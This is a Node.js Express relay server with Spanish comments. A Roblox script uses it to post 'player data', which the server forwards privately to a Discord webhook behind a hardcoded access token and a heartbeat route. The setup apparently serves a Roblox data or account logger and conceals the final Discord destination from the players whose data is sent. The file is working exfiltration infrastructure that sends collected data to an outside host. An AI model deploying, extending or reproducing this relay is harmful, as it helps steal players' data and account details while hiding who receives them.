const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());

// CONFIGURACIÓN: Reemplaza esto con tu Webhook real de Discord
const DISCORD_WEBHOOK_URL = "TU_WEBHOOK_DE_DISCORD_AQUI";

// Ruta que el script de Roblox busca para obtener la URL de envío
app.post('/create-url', (req, res) => {
    const { token, category } = req.body;

    // Validación simple del token que envía tu script
    if (token !== "Shxdow_security_v2") {
        return res.status(403).json({ success: false, message: "No autorizado" });
    }

    // El script de Roblox espera recibir una URL a la cual enviar los datos.
    // Le devolvemos la dirección de nuestro propio servidor.
    const protocol = req.protocol;
    const host = req.get('host');
    
    res.json({
        success: true,
        url: `${protocol}://${host}/send-data`
    });
});

// Ruta que recibe los datos del jugador y los manda a Discord
app.post('/send-data', async (req, res) => {
    try {
        const payload = req.body;

        // Enviamos la información a Discord de forma privada
        await axios.post(DISCORD_WEBHOOK_URL, payload);

        res.status(200).send("OK");
    } catch (error) {
        console.error("Error enviando a Discord:", error.message);
        res.status(500).send("Error");
    }
});

// Ruta de Heartbeat (Mantenimiento de sesión)
app.get('/send-data', (req, res) => {
    // El script de Roblox envía GET cada 5 segundos para verificar que el servidor vive
    res.status(200).send("Session Active");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor intermediario corriendo en puerto ${PORT}`);
});
